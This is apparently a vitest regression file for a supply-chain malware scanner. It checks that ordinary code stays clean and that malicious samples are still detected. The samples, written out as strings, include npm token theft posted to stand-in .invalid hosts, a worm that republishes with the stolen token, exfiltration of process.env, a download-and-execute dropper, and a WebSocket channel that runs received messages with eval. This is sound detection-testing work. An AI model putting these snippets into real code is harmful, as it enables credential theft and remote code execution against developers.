import { describe, it, expect, beforeAll, afterAll } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { scan } from "../scanner.js";
import type { Finding } from "../types.js";

/**
 * PRECISION REGRESSION CORPUS.
 *
 * Every false positive this scanner has shipped was found by someone measuring
 * ad hoc, which means a new one surfaces every time someone looks. This file
 * exists so that stops: it scans a pinned corpus of ORDINARY third-party-shaped
 * source and fails the build if any rule fires on it, and it scans a matching
 * corpus of genuinely malicious source and fails the build if any rule STOPS
 * firing. A new over-broad rule cannot be merged without turning this red.
 *
 * The corpus is committed as strings and materialised into a temp directory at
 * run time, for two reasons: files under `__tests__/` (or any path matching
 * TEST_FILE_REGEX in scanner.ts) are skipped by every `notTestFile` rule, which
 * would make the whole harness vacuous; and committing runnable malware-shaped
 * .js files into the repo would trip the project's own self-scan.
 *
 * When adding a rule, add BOTH: a legitimate sample that must stay clean and a
 * malicious sample that must fire.
 */

/** Ordinary code. Nothing here may produce a high or critical finding. */
const LEGITIMATE: Record<string, string> = {
  // Every library repo has a release script. This was CRITICAL (SHAI_HULUD_WORM).
  "release.js": `const { execSync } = require("child_process");
module.exports = function release() {
  execSync("npm run build");
  console.log("Now run: npm publish --access public");
};
`,
  // Enterprise egress config. This was CRITICAL (GHOSTSOCKS_SOCKS5).
  "proxy-config.js": `const SUPPORTED = ["HTTP", "HTTPS", "SOCKS4", "SOCKS5"];
function pick(kind) {
  return SUPPORTED.includes(kind) ? kind : "HTTP";
}
module.exports = { SUPPORTED, pick };
`,
  // CI publish helper. This was HIGH, twice (SHAI_HULUD_CRED_STEAL).
  "ci-helper.js": `const fs = require("fs");
module.exports = function writeNpmrc(home) {
  fs.writeFileSync(home + "/.npmrc", "//registry.npmjs.org/:_authToken=\${NPM_TOKEN}\\n");
};
`,
  // A gist link in a comment is a citation. This was HIGH (DEAD_DROP_GIST).
  "docs.js": `// Worked example: https://gist.github.com/someuser/12345678
// See also the discussion linked from the README.
module.exports = {};
`,
  // How every frontend builds a websocket URL. This was HIGH (C2_WEBSOCKET_DYNAMIC).
  "ws-client.js": `export function connect(host) {
  return new WebSocket(\`wss://\${host}/stream\`);
}
`,
  // Plain ES6 Proxy, as used by prisma/vitest/jiti. This was HIGH (PROXY_HANDLER_TRAP).
  "proxy-util.js": `const store = {};
const p = new Proxy(store, {
  get: (t, k) => t[k],
  set: (t, k, v) => { t[k] = v; return true; },
});
module.exports = p;
`,
  // Cache-compiling into tmpdir, as tsx/jiti/prisma do. This was CRITICAL
  // (DROPPER_TEMP_EXEC).
  "cache-compile.js": `const os = require("os");
const fs = require("fs");
const { execSync } = require("child_process");
module.exports = function build(src) {
  const out = os.tmpdir() + "/build-cache.js";
  fs.writeFileSync(out, src);
  return execSync("node " + out).toString();
};
`,
  // napi-rs style version check: "got" is the English word. This was HIGH
  // (ENV_EXFILTRATION).
  "version-check.js": `module.exports = function check(actual) {
  if (process.env.NAPI_RS_ENFORCE_VERSION_CHECK) {
    throw new Error("Native binding version mismatch, expected 1.1.5 but got " + actual);
  }
};
`,
  // Base64 in a WASM-ish blob is not an AWS key. This was CRITICAL
  // (SECRETS_AWS_KEY) on a padded, repetitive body.
  "wasm-blob.js": `const TABLE = "AKIAAAB0AAAAAAAAAKMA";
module.exports = { TABLE };
`,
  // Legitimate scoped dependencies. The scoped catch-all reported ~94% of all
  // scoped packages, and the -core/-utils suffixes were CRITICAL dependency
  // confusion verdicts.
  "package.json": JSON.stringify(
    {
      name: "ordinary-app",
      version: "1.0.0",
      dependencies: {
        "@babel/helper-plugin-utils": "^7.24.0",
        "@vue/compiler-core": "^3.4.0",
        "@tanstack/query-core": "^5.0.0",
        "@jest/expect-utils": "^29.0.0",
        "@vitest/runner": "^1.0.0",
        "@typescript-eslint/parser": "^7.0.0",
        preact: "^10.19.0",
        viem: "^2.21.0",
        acorn: "^8.11.0",
        pathe: "^2.0.0",
        nuxt: "^3.10.0",
        vue: "^3.4.0",
        vuex: "^4.1.0",
        mysql: "^2.18.1",
        mysql2: "^3.9.0",
      },
    },
    null,
    2,
  ),
};

/** Genuinely malicious code. Each entry must produce its expected rule. */
const MALICIOUS: Record<string, { source: string; expect: string }> = {
  "worm.js": {
    expect: "SHAI_HULUD_WORM",
    source: `const { execSync } = require("child_process");
const fs = require("fs");
const token = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");
fetch("https://exfil.invalid/c", { method: "POST", body: token });
execSync("npm publish --//registry.npmjs.org/:_authToken=" + token);
`,
  },
  "credsteal.js": {
    expect: "SHAI_HULUD_CRED_STEAL",
    source: `const fs = require("fs");
const creds = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");
require("axios").post("https://collect.invalid/n", { NPM_TOKEN: creds });
`,
  },
  "socks.js": {
    expect: "GHOSTSOCKS_SOCKS5",
    source: `const handshake = Buffer.from([0x05, 0x01, 0x00]);
function connect_socks(host, port) { return send(handshake, host, port); }
`,
  },
  "deaddrop.js": {
    expect: "DEAD_DROP_GIST",
    source: `const cfg = await fetch("https://gist.githubusercontent.com/exampleuser/0f1e2d3c4b5a69788796a5b4c3d2e1f0/raw/cfg.txt");
const c2 = await cfg.text();
`,
  },
  "wsc2.js": {
    expect: "C2_WEBSOCKET_DYNAMIC",
    source: `const ws = new WebSocket(atob("d3NzOi8vZXZpbC5pbnZhbGlkL2M="));
ws.onmessage = (m) => eval(m.data);
`,
  },
  "dropper.js": {
    expect: "DROPPER_TEMP_EXEC",
    source: `const os = require("os");
const fs = require("fs");
const { execSync } = require("child_process");
const payload = await fetch("https://cdn.invalid/p.exe").then((r) => r.arrayBuffer());
fs.writeFileSync(os.tmpdir() + "/p.exe", Buffer.from(payload));
execSync(os.tmpdir() + "/p.exe");
`,
  },
  "awskey.js": {
    expect: "SECRETS_AWS_KEY",
    source: `const AWS_ACCESS_KEY_ID = "AKIA7RJ4KQ2XZ9M3PLWD";\n`,
  },
  "envexfil.js": {
    expect: "ENV_EXFILTRATION",
    // Network call BEFORE process.env. This ordering used to be missed entirely.
    source: `await fetch("https://collect.invalid/e", { method: "POST", body: JSON.stringify(process.env) });\n`,
  },
  "proxytrap.js": {
    expect: "PROXY_HANDLER_TRAP",
    // Written on ONE line deliberately. checkFilePatterns() in scanner.ts splits
    // content on newlines and matches per line, so no rule whose regex spans a
    // construct can see a version of it broken across lines. That is a
    // pre-existing engine limitation, not a property of this rule, and it is why
    // the same payload formatted across two lines is invisible today. Recorded
    // here so the constraint is not rediscovered as a bug.
    source: `const p = new Proxy(target, { get: (t, k) => { fetch("https://x.invalid/?k=" + k); return t[k]; } });\n`,
  },
};

const writeCorpus = (files: Record<string, string>, prefix: string): string => {
  // Deliberately NOT under __tests__ or any /test/ path: scanner.ts skips those
  // for every notTestFile rule, which would make this harness prove nothing.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  for (const [name, source] of Object.entries(files)) {
    fs.writeFileSync(path.join(dir, name), source);
  }
  return dir;
};

describe("precision corpus: ordinary code must stay clean", () => {
  let findings: Finding[];
  let dir: string;

  beforeAll(async () => {
    dir = writeCorpus(LEGITIMATE, "scg-legit-");
    findings = (await scan({ target: dir, format: "json" })).findings;
  });

  afterAll(() => fs.rmSync(dir, { recursive: true, force: true }));

  it("produces NO critical findings", () => {
    const hits = findings.filter((f) => f.severity === "critical");
    expect(hits.map((f) => `${f.rule} in ${path.basename(f.file ?? "")}`)).toEqual([]);
  });

  it("produces NO high findings", () => {
    const hits = findings.filter((f) => f.severity === "high");
    expect(hits.map((f) => `${f.rule} in ${path.basename(f.file ?? "")}`)).toEqual([]);
  });

  it("does not report any typosquat or dependency-confusion verdict", () => {
    const hits = findings.filter(
      (f) => /^TYPOSQUAT|^DEP_INTERNAL|^MALICIOUS_(DEPENDENCY|PACKAGE)/.test(f.rule),
    );
    expect(hits.map((f) => f.rule)).toEqual([]);
  });

  it("stays within a total finding budget", () => {
    // A budget rather than zero, because medium/low advisory rules legitimately
    // comment on this corpus (an external wss:// URL, SLSA provenance level).
    // The point is that a NEW over-broad rule cannot slip in unnoticed.
    const budget = 6;
    const notable = findings.filter((f) => f.severity !== "info");
    expect(
      notable.length,
      `over budget: ${notable.map((f) => `${f.severity}:${f.rule}`).join(", ")}`,
    ).toBeLessThanOrEqual(budget);
  });
});

describe("precision corpus: malicious code must still be caught", () => {
  let findings: Finding[];
  let dir: string;

  beforeAll(async () => {
    const files = Object.fromEntries(
      Object.entries(MALICIOUS).map(([name, v]) => [name, v.source]),
    );
    dir = writeCorpus(files, "scg-mal-");
    findings = (await scan({ target: dir, format: "json" })).findings;
  });

  afterAll(() => fs.rmSync(dir, { recursive: true, force: true }));

  for (const [name, { expect: rule }] of Object.entries(MALICIOUS)) {
    it(`still detects ${rule} in ${name}`, () => {
      const hit = findings.some(
        (f) => f.rule === rule && path.basename(f.file ?? "") === name,
      );
      expect(hit).toBe(true);
    });
  }
});
